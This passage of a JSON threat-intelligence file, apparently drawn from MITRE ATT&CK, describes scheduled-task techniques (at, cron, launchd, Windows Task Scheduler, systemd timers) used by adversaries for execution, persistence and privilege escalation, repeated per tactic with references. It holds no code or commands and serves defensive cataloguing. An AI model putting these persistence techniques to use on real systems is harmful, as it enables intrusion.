    "technique_description": "<p>Adversaries may abuse the <a href=\"https://attack.mitre.org/software/S0110\">at</a> utility to perform task scheduling for initial or recurring execution of malicious code. The <a href=\"https://attack.mitre.org/software/S0110\">at</a> command within Linux operating systems enables administrators to schedule tasks.(Citation: Kifarunix - Task Scheduling in Linux)<!-- raw HTML omitted --><!-- raw HTML omitted -->An adversary may use <a href=\"https://attack.mitre.org/software/S0110\">at</a> in Linux environments to execute programs at system startup or on a scheduled basis for persistence. <a href=\"https://attack.mitre.org/software/S0110\">at</a> can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account.</p>\n",
    "technique_references": [
      {
        "source_name": "Kifarunix - Task Scheduling in Linux",
        "url": "https://kifarunix.com/scheduling-tasks-using-at-command-in-linux/",
        "description": "Koromicha. (2019, September 7). Scheduling tasks using at command in Linux. Retrieved December 3, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--f3d95a1f-bba2-44ce-9af7-37866cd63fd0",
    "platform": "windows",
    "tid": "T1053.002",
    "technique": "At (Windows)",
    "tactic": "execution",
    "datasources": "file-monitoring|process-command-line-parameters|process-monitoring|windows-event-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may abuse the <!-- raw HTML omitted -->at.exe<!-- raw HTML omitted --> utility to perform task scheduling for initial or recurring execution of malicious code. The <a href=\"https://attack.mitre.org/software/S0110\">at</a> utility exists as an executable within Windows for scheduling tasks at a specified time and date. Using <a href=\"https://attack.mitre.org/software/S0110\">at</a> requires that the Task Scheduler service be running, and the user to be logged on as a member of the local Administrators group. <!-- raw HTML omitted --><!-- raw HTML omitted -->An adversary may use <!-- raw HTML omitted -->at.exe<!-- raw HTML omitted --> in Windows environments to execute programs at system startup or on a scheduled basis for persistence. <a href=\"https://attack.mitre.org/software/S0110\">at</a> can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account (such as SYSTEM).<!-- raw HTML omitted --><!-- raw HTML omitted -->Note: The <!-- raw HTML omitted -->at.exe<!-- raw HTML omitted --> command line utility has been deprecated in current versions of Windows in favor of <!-- raw HTML omitted -->schtasks<!-- raw HTML omitted -->.</p>\n",
    "technique_references": [
      {
        "source_name": "Twitter Leoloobeek Scheduled Task",
        "url": "https://twitter.com/leoloobeek/status/939248813465853953",
        "description": "Loobeek, L. (2017, December 8). leoloobeek Status. Retrieved December 12, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Forum Scheduled Task Operational Setting",
        "url": "https://social.technet.microsoft.com/Forums/en-US/e5bca729-52e7-4fcb-ba12-3225c564674c/scheduled-tasks-history-retention-settings?forum=winserver8gen",
        "description": "Satyajit321. (2015, November 3). Scheduled Tasks History Retention settings. Retrieved December 12, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Scheduled Task Events",
        "url": "https://technet.microsoft.com/library/dd315590.aspx",
        "description": "Microsoft. (n.d.). General Task Registration. Retrieved December 12, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Scheduled Task Events Win10",
        "url": "https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-other-object-access-events",
        "description": "Microsoft. (2017, May 28). Audit Other Object Access Events. Retrieved June 27, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Autoruns",
        "url": "https://technet.microsoft.com/en-us/sysinternals/bb963902",
        "description": "Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--f3d95a1f-bba2-44ce-9af7-37866cd63fd0",
    "platform": "windows",
    "tid": "T1053.002",
    "technique": "At (Windows)",
    "tactic": "persistence",
    "datasources": "file-monitoring|process-command-line-parameters|process-monitoring|windows-event-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may abuse the <!-- raw HTML omitted -->at.exe<!-- raw HTML omitted --> utility to perform task scheduling for initial or recurring execution of malicious code. The <a href=\"https://attack.mitre.org/software/S0110\">at</a> utility exists as an executable within Windows for scheduling tasks at a specified time and date. Using <a href=\"https://attack.mitre.org/software/S0110\">at</a> requires that the Task Scheduler service be running, and the user to be logged on as a member of the local Administrators group. <!-- raw HTML omitted --><!-- raw HTML omitted -->An adversary may use <!-- raw HTML omitted -->at.exe<!-- raw HTML omitted --> in Windows environments to execute programs at system startup or on a scheduled basis for persistence. <a href=\"https://attack.mitre.org/software/S0110\">at</a> can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account (such as SYSTEM).<!-- raw HTML omitted --><!-- raw HTML omitted -->Note: The <!-- raw HTML omitted -->at.exe<!-- raw HTML omitted --> command line utility has been deprecated in current versions of Windows in favor of <!-- raw HTML omitted -->schtasks<!-- raw HTML omitted -->.</p>\n",
    "technique_references": [
      {
        "source_name": "Twitter Leoloobeek Scheduled Task",
        "url": "https://twitter.com/leoloobeek/status/939248813465853953",
        "description": "Loobeek, L. (2017, December 8). leoloobeek Status. Retrieved December 12, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Forum Scheduled Task Operational Setting",
        "url": "https://social.technet.microsoft.com/Forums/en-US/e5bca729-52e7-4fcb-ba12-3225c564674c/scheduled-tasks-history-retention-settings?forum=winserver8gen",
        "description": "Satyajit321. (2015, November 3). Scheduled Tasks History Retention settings. Retrieved December 12, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Scheduled Task Events",
        "url": "https://technet.microsoft.com/library/dd315590.aspx",
        "description": "Microsoft. (n.d.). General Task Registration. Retrieved December 12, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Scheduled Task Events Win10",
        "url": "https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-other-object-access-events",
        "description": "Microsoft. (2017, May 28). Audit Other Object Access Events. Retrieved June 27, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Autoruns",
        "url": "https://technet.microsoft.com/en-us/sysinternals/bb963902",
        "description": "Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--f3d95a1f-bba2-44ce-9af7-37866cd63fd0",
    "platform": "windows",
    "tid": "T1053.002",
    "technique": "At (Windows)",
    "tactic": "privilege-escalation",
    "datasources": "file-monitoring|process-command-line-parameters|process-monitoring|windows-event-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may abuse the <!-- raw HTML omitted -->at.exe<!-- raw HTML omitted --> utility to perform task scheduling for initial or recurring execution of malicious code. The <a href=\"https://attack.mitre.org/software/S0110\">at</a> utility exists as an executable within Windows for scheduling tasks at a specified time and date. Using <a href=\"https://attack.mitre.org/software/S0110\">at</a> requires that the Task Scheduler service be running, and the user to be logged on as a member of the local Administrators group. <!-- raw HTML omitted --><!-- raw HTML omitted -->An adversary may use <!-- raw HTML omitted -->at.exe<!-- raw HTML omitted --> in Windows environments to execute programs at system startup or on a scheduled basis for persistence. <a href=\"https://attack.mitre.org/software/S0110\">at</a> can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account (such as SYSTEM).<!-- raw HTML omitted --><!-- raw HTML omitted -->Note: The <!-- raw HTML omitted -->at.exe<!-- raw HTML omitted --> command line utility has been deprecated in current versions of Windows in favor of <!-- raw HTML omitted -->schtasks<!-- raw HTML omitted -->.</p>\n",
    "technique_references": [
      {
        "source_name": "Twitter Leoloobeek Scheduled Task",
        "url": "https://twitter.com/leoloobeek/status/939248813465853953",
        "description": "Loobeek, L. (2017, December 8). leoloobeek Status. Retrieved December 12, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Forum Scheduled Task Operational Setting",
        "url": "https://social.technet.microsoft.com/Forums/en-US/e5bca729-52e7-4fcb-ba12-3225c564674c/scheduled-tasks-history-retention-settings?forum=winserver8gen",
        "description": "Satyajit321. (2015, November 3). Scheduled Tasks History Retention settings. Retrieved December 12, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Scheduled Task Events",
        "url": "https://technet.microsoft.com/library/dd315590.aspx",
        "description": "Microsoft. (n.d.). General Task Registration. Retrieved December 12, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Scheduled Task Events Win10",
        "url": "https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-other-object-access-events",
        "description": "Microsoft. (2017, May 28). Audit Other Object Access Events. Retrieved June 27, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Autoruns",
        "url": "https://technet.microsoft.com/en-us/sysinternals/bb963902",
        "description": "Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--2acf44aa-542f-4366-b4eb-55ef5747759c",
    "platform": "linux|macos",
    "tid": "T1053.003",
    "technique": "Cron",
    "tactic": "execution",
    "datasources": "process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may abuse the <!-- raw HTML omitted -->cron<!-- raw HTML omitted --> utility to perform task scheduling for initial or recurring execution of malicious code. The <!-- raw HTML omitted -->cron<!-- raw HTML omitted --> utility is a time-based job scheduler for Unix-like operating systems.  The <!-- raw HTML omitted --> crontab<!-- raw HTML omitted --> file contains the schedule of cron entries to be run and the specified times for execution. Any <!-- raw HTML omitted -->crontab<!-- raw HTML omitted --> files are stored in operating system-specific file paths.<!-- raw HTML omitted --><!-- raw HTML omitted -->An adversary may use <!-- raw HTML omitted -->cron<!-- raw HTML omitted --> in Linux or Unix environments to execute programs at system startup or on a scheduled basis for persistence. <!-- raw HTML omitted -->cron<!-- raw HTML omitted --> can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account.</p>\n",
    "technique_references": []
  },
  {
    "id": "attack-pattern--2acf44aa-542f-4366-b4eb-55ef5747759c",
    "platform": "linux|macos",
    "tid": "T1053.003",
    "technique": "Cron",
    "tactic": "persistence",
    "datasources": "process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may abuse the <!-- raw HTML omitted -->cron<!-- raw HTML omitted --> utility to perform task scheduling for initial or recurring execution of malicious code. The <!-- raw HTML omitted -->cron<!-- raw HTML omitted --> utility is a time-based job scheduler for Unix-like operating systems.  The <!-- raw HTML omitted --> crontab<!-- raw HTML omitted --> file contains the schedule of cron entries to be run and the specified times for execution. Any <!-- raw HTML omitted -->crontab<!-- raw HTML omitted --> files are stored in operating system-specific file paths.<!-- raw HTML omitted --><!-- raw HTML omitted -->An adversary may use <!-- raw HTML omitted -->cron<!-- raw HTML omitted --> in Linux or Unix environments to execute programs at system startup or on a scheduled basis for persistence. <!-- raw HTML omitted -->cron<!-- raw HTML omitted --> can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account.</p>\n",
    "technique_references": []
  },
  {
    "id": "attack-pattern--2acf44aa-542f-4366-b4eb-55ef5747759c",
    "platform": "linux|macos",
    "tid": "T1053.003",
    "technique": "Cron",
    "tactic": "privilege-escalation",
    "datasources": "process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may abuse the <!-- raw HTML omitted -->cron<!-- raw HTML omitted --> utility to perform task scheduling for initial or recurring execution of malicious code. The <!-- raw HTML omitted -->cron<!-- raw HTML omitted --> utility is a time-based job scheduler for Unix-like operating systems.  The <!-- raw HTML omitted --> crontab<!-- raw HTML omitted --> file contains the schedule of cron entries to be run and the specified times for execution. Any <!-- raw HTML omitted -->crontab<!-- raw HTML omitted --> files are stored in operating system-specific file paths.<!-- raw HTML omitted --><!-- raw HTML omitted -->An adversary may use <!-- raw HTML omitted -->cron<!-- raw HTML omitted --> in Linux or Unix environments to execute programs at system startup or on a scheduled basis for persistence. <!-- raw HTML omitted -->cron<!-- raw HTML omitted --> can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account.</p>\n",
    "technique_references": []
  },
  {
    "id": "attack-pattern--8faedf87-dceb-4c35-b2a2-7286f59a3bc3",
    "platform": "macos",
    "tid": "T1053.004",
    "technique": "Launchd",
    "tactic": "execution",
    "datasources": "file-monitoring|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may abuse the <!-- raw HTML omitted -->Launchd<!-- raw HTML omitted --> daemon to perform task scheduling for initial or recurring execution of malicious code. The <!-- raw HTML omitted -->launchd<!-- raw HTML omitted --> daemon, native to macOS, is responsible for loading and maintaining services within the operating system. This process loads the parameters for each launch-on-demand system-level daemon from the property list (plist) files found in <!-- raw HTML omitted -->/System/Library/LaunchDaemons<!-- raw HTML omitted --> and <!-- raw HTML omitted -->/Library/LaunchDaemons<!-- raw HTML omitted --> (Citation: AppleDocs Launch Agent Daemons). These LaunchDaemons have property list files which point to the executables that will be launched (Citation: Methods of Mac Malware Persistence).<!-- raw HTML omitted --><!-- raw HTML omitted -->An adversary may use the <!-- raw HTML omitted -->launchd<!-- raw HTML omitted --> daemon in macOS environments to schedule new executables to run at system startup or on a scheduled basis for persistence. <!-- raw HTML omitted -->launchd<!-- raw HTML omitted --> can also be abused to run a process under the context of a specified account. Daemons, such as <!-- raw HTML omitted -->launchd<!-- raw HTML omitted -->, run with the permissions of the root user account, and will operate regardless of which user account is logged in.</p>\n",
    "technique_references": [
      {
        "source_name": "AppleDocs Launch Agent Daemons",
        "url": "https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html",
        "description": "Apple. (n.d.). Creating Launch Daemons and Agents. Retrieved July 10, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Methods of Mac Malware Persistence",
        "url": "https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf",
        "description": "Patrick Wardle. (2014, September). Methods of Malware Persistence on Mac OS X. Retrieved July 5, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--8faedf87-dceb-4c35-b2a2-7286f59a3bc3",
    "platform": "macos",
    "tid": "T1053.004",
    "technique": "Launchd",
    "tactic": "persistence",
    "datasources": "file-monitoring|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may abuse the <!-- raw HTML omitted -->Launchd<!-- raw HTML omitted --> daemon to perform task scheduling for initial or recurring execution of malicious code. The <!-- raw HTML omitted -->launchd<!-- raw HTML omitted --> daemon, native to macOS, is responsible for loading and maintaining services within the operating system. This process loads the parameters for each launch-on-demand system-level daemon from the property list (plist) files found in <!-- raw HTML omitted -->/System/Library/LaunchDaemons<!-- raw HTML omitted --> and <!-- raw HTML omitted -->/Library/LaunchDaemons<!-- raw HTML omitted --> (Citation: AppleDocs Launch Agent Daemons). These LaunchDaemons have property list files which point to the executables that will be launched (Citation: Methods of Mac Malware Persistence).<!-- raw HTML omitted --><!-- raw HTML omitted -->An adversary may use the <!-- raw HTML omitted -->launchd<!-- raw HTML omitted --> daemon in macOS environments to schedule new executables to run at system startup or on a scheduled basis for persistence. <!-- raw HTML omitted -->launchd<!-- raw HTML omitted --> can also be abused to run a process under the context of a specified account. Daemons, such as <!-- raw HTML omitted -->launchd<!-- raw HTML omitted -->, run with the permissions of the root user account, and will operate regardless of which user account is logged in.</p>\n",
    "technique_references": [
      {
        "source_name": "AppleDocs Launch Agent Daemons",
        "url": "https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html",
        "description": "Apple. (n.d.). Creating Launch Daemons and Agents. Retrieved July 10, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Methods of Mac Malware Persistence",
        "url": "https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf",
        "description": "Patrick Wardle. (2014, September). Methods of Malware Persistence on Mac OS X. Retrieved July 5, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--8faedf87-dceb-4c35-b2a2-7286f59a3bc3",
    "platform": "macos",
    "tid": "T1053.004",
    "technique": "Launchd",
    "tactic": "privilege-escalation",
    "datasources": "file-monitoring|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may abuse the <!-- raw HTML omitted -->Launchd<!-- raw HTML omitted --> daemon to perform task scheduling for initial or recurring execution of malicious code. The <!-- raw HTML omitted -->launchd<!-- raw HTML omitted --> daemon, native to macOS, is responsible for loading and maintaining services within the operating system. This process loads the parameters for each launch-on-demand system-level daemon from the property list (plist) files found in <!-- raw HTML omitted -->/System/Library/LaunchDaemons<!-- raw HTML omitted --> and <!-- raw HTML omitted -->/Library/LaunchDaemons<!-- raw HTML omitted --> (Citation: AppleDocs Launch Agent Daemons). These LaunchDaemons have property list files which point to the executables that will be launched (Citation: Methods of Mac Malware Persistence).<!-- raw HTML omitted --><!-- raw HTML omitted -->An adversary may use the <!-- raw HTML omitted -->launchd<!-- raw HTML omitted --> daemon in macOS environments to schedule new executables to run at system startup or on a scheduled basis for persistence. <!-- raw HTML omitted -->launchd<!-- raw HTML omitted --> can also be abused to run a process under the context of a specified account. Daemons, such as <!-- raw HTML omitted -->launchd<!-- raw HTML omitted -->, run with the permissions of the root user account, and will operate regardless of which user account is logged in.</p>\n",
    "technique_references": [
      {
        "source_name": "AppleDocs Launch Agent Daemons",
        "url": "https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html",
        "description": "Apple. (n.d.). Creating Launch Daemons and Agents. Retrieved July 10, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Methods of Mac Malware Persistence",
        "url": "https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-Wardle.pdf",
        "description": "Patrick Wardle. (2014, September). Methods of Malware Persistence on Mac OS X. Retrieved July 5, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--005a06c6-14bf-4118-afa0-ebcd8aebb0c9",
    "platform": "windows",
    "tid": "T1053.005",
    "technique": "Scheduled Task",
    "tactic": "execution",
    "datasources": "file-monitoring|process-command-line-parameters|process-monitoring|windows-event-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The <!-- raw HTML omitted -->schtasks<!-- raw HTML omitted --> can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library to create a scheduled task.<!-- raw HTML omitted --><!-- raw HTML omitted -->The deprecated <a href=\"https://attack.mitre.org/software/S0110\">at</a> utility could also be abused by adversaries (ex: <a href=\"https://attack.mitre.org/techniques/T1053/002\">At (Windows)</a>), though <!-- raw HTML omitted -->at.exe<!-- raw HTML omitted --> can not access tasks created with <!-- raw HTML omitted -->schtasks<!-- raw HTML omitted --> or the Control Panel.<!-- raw HTML omitted --><!-- raw HTML omitted -->An adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account (such as SYSTEM).</p>\n",
    "technique_references": [
      {
        "source_name": "Twitter Leoloobeek Scheduled Task",
        "url": "https://twitter.com/leoloobeek/status/939248813465853953",
        "description": "Loobeek, L. (2017, December 8). leoloobeek Status. Retrieved December 12, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Forum Scheduled Task Operational Setting",
        "url": "https://social.technet.microsoft.com/Forums/en-US/e5bca729-52e7-4fcb-ba12-3225c564674c/scheduled-tasks-history-retention-settings?forum=winserver8gen",
        "description": "Satyajit321. (2015, November 3). Scheduled Tasks History Retention settings. Retrieved December 12, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Scheduled Task Events",
        "url": "https://technet.microsoft.com/library/dd315590.aspx",
        "description": "Microsoft. (n.d.). General Task Registration. Retrieved December 12, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Scheduled Task Events Win10",
        "url": "https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-other-object-access-events",
        "description": "Microsoft. (2017, May 28). Audit Other Object Access Events. Retrieved June 27, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Autoruns",
        "url": "https://technet.microsoft.com/en-us/sysinternals/bb963902",
        "description": "Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--005a06c6-14bf-4118-afa0-ebcd8aebb0c9",
    "platform": "windows",
    "tid": "T1053.005",
    "technique": "Scheduled Task",
    "tactic": "persistence",
    "datasources": "file-monitoring|process-command-line-parameters|process-monitoring|windows-event-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The <!-- raw HTML omitted -->schtasks<!-- raw HTML omitted --> can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library to create a scheduled task.<!-- raw HTML omitted --><!-- raw HTML omitted -->The deprecated <a href=\"https://attack.mitre.org/software/S0110\">at</a> utility could also be abused by adversaries (ex: <a href=\"https://attack.mitre.org/techniques/T1053/002\">At (Windows)</a>), though <!-- raw HTML omitted -->at.exe<!-- raw HTML omitted --> can not access tasks created with <!-- raw HTML omitted -->schtasks<!-- raw HTML omitted --> or the Control Panel.<!-- raw HTML omitted --><!-- raw HTML omitted -->An adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account (such as SYSTEM).</p>\n",
    "technique_references": [
      {
        "source_name": "Twitter Leoloobeek Scheduled Task",
        "url": "https://twitter.com/leoloobeek/status/939248813465853953",
        "description": "Loobeek, L. (2017, December 8). leoloobeek Status. Retrieved December 12, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Forum Scheduled Task Operational Setting",
        "url": "https://social.technet.microsoft.com/Forums/en-US/e5bca729-52e7-4fcb-ba12-3225c564674c/scheduled-tasks-history-retention-settings?forum=winserver8gen",
        "description": "Satyajit321. (2015, November 3). Scheduled Tasks History Retention settings. Retrieved December 12, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Scheduled Task Events",
        "url": "https://technet.microsoft.com/library/dd315590.aspx",
        "description": "Microsoft. (n.d.). General Task Registration. Retrieved December 12, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Scheduled Task Events Win10",
        "url": "https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-other-object-access-events",
        "description": "Microsoft. (2017, May 28). Audit Other Object Access Events. Retrieved June 27, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Autoruns",
        "url": "https://technet.microsoft.com/en-us/sysinternals/bb963902",
        "description": "Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--005a06c6-14bf-4118-afa0-ebcd8aebb0c9",
    "platform": "windows",
    "tid": "T1053.005",
    "technique": "Scheduled Task",
    "tactic": "privilege-escalation",
    "datasources": "file-monitoring|process-command-line-parameters|process-monitoring|windows-event-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The <!-- raw HTML omitted -->schtasks<!-- raw HTML omitted --> can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library to create a scheduled task.<!-- raw HTML omitted --><!-- raw HTML omitted -->The deprecated <a href=\"https://attack.mitre.org/software/S0110\">at</a> utility could also be abused by adversaries (ex: <a href=\"https://attack.mitre.org/techniques/T1053/002\">At (Windows)</a>), though <!-- raw HTML omitted -->at.exe<!-- raw HTML omitted --> can not access tasks created with <!-- raw HTML omitted -->schtasks<!-- raw HTML omitted --> or the Control Panel.<!-- raw HTML omitted --><!-- raw HTML omitted -->An adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account (such as SYSTEM).</p>\n",
    "technique_references": [
      {
        "source_name": "Twitter Leoloobeek Scheduled Task",
        "url": "https://twitter.com/leoloobeek/status/939248813465853953",
        "description": "Loobeek, L. (2017, December 8). leoloobeek Status. Retrieved December 12, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Forum Scheduled Task Operational Setting",
        "url": "https://social.technet.microsoft.com/Forums/en-US/e5bca729-52e7-4fcb-ba12-3225c564674c/scheduled-tasks-history-retention-settings?forum=winserver8gen",
        "description": "Satyajit321. (2015, November 3). Scheduled Tasks History Retention settings. Retrieved December 12, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Scheduled Task Events",
        "url": "https://technet.microsoft.com/library/dd315590.aspx",
        "description": "Microsoft. (n.d.). General Task Registration. Retrieved December 12, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Scheduled Task Events Win10",
        "url": "https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-other-object-access-events",
        "description": "Microsoft. (2017, May 28). Audit Other Object Access Events. Retrieved June 27, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet Autoruns",
        "url": "https://technet.microsoft.com/en-us/sysinternals/bb963902",
        "description": "Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--a542bac9-7bc1-4da7-9a09-96f69e23cc21",
    "platform": "linux",
    "tid": "T1053.006",
    "technique": "Systemd Timers",
    "tactic": "execution",
    "datasources": "file-monitoring|process-command-line-parameters|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
